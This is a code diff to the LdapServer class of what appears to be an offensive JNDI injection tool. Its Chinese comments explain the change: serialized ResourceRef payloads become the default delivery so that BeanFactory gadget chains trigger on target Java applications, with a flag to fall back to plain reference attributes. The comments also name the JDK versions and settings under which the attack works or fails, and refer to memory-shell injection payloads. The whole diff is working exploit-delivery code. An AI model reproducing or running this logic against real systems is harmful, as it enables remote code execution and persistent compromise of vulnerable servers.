@@ -106,23 +106,36 @@ public class LdapServer extends InMemoryOperationInterceptor {
                 e.addAttribute("javaFactory", className);
                 payloadResult = className;
             } else {
-                // BeanFactory/Reference 系默认直返 Reference 属性（JDK 8u381+/11.0.20+/17.0.8+
-                // 起 javaSerializedData 默认不被客户端信任）；--force-serialize 回退旧行为。
-                Reference ref = config.forceSerialize ? null : ChainDispatcher.generateReference(route);
+                // Reference 系默认走 javaSerializedData（序列化 ResourceRef）投递：
+                // 目标端从 javaReferenceAddress 属性只能重建出裸 javax.naming.Reference，
+                // 不满足 BeanFactory 的 instanceof ResourceRef 判断会直接返回 null；
+                // 反序列化得到的 ResourceRef 才能命中工厂。
+                // 目标端前提：trustSerialData=true（8u431/11.0.25/17.0.13/21.0.5 起默认 false），
+                // 且 JDK 21+ 的 jdk.jndi.ldap.object.factoriesFilter 默认仅放行 JDK 内置工厂，
+                // 该条件下两种投递均不可用。
+                // --ref-attrs 回退属性直返（仅限接受裸 Reference 的工厂，如 MemoryUserDatabaseFactory）。
+                boolean useRefAttrs = config.refAttrs && RefFactory.supports(route.getPayloadType());
+                Reference ref = useRefAttrs ? ChainDispatcher.generateReference(route) : null;
                 if (ref != null) {
                     writeReferenceAttributes(e, ref);
                     payloadResult = "ref:" + route.getPayloadType();
-                } else if (!config.forceSerialize && RefFactory.supports(route.getPayloadType())) {
+                } else if (useRefAttrs) {
                     // RefFactory 支持但拒绝生成（如 ELjakarta 内存马注入），已明确报错，
                     // 不回退序列化路径产出废 payload
                     System.out.println("Reference 生成被拒绝: " + route.getPayloadType());
                 } else {
                     String s = ChainDispatcher.generate(route);
-                    try {
-                        e.addAttribute("javaSerializedData", Base64.decode(s));
-                        payloadResult = s;
-                    } catch (Exception e1) {
-                        System.out.println("生成payload失败，使用的模块类型不正确或者命令错误");
+                    if (s == null) {
+                        System.out.println(RefFactory.supports(route.getPayloadType())
+                                ? "Reference 生成被拒绝: " + route.getPayloadType()
+                                : "生成payload失败，使用的模块类型不正确或者命令错误");
+                    } else {
+                        try {
+                            e.addAttribute("javaSerializedData", Base64.decode(s));
+                            payloadResult = s;
+                        } catch (Exception e1) {
+                            System.out.println("生成payload失败，使用的模块类型不正确或者命令错误");
+                        }
                     }
                 }
             }
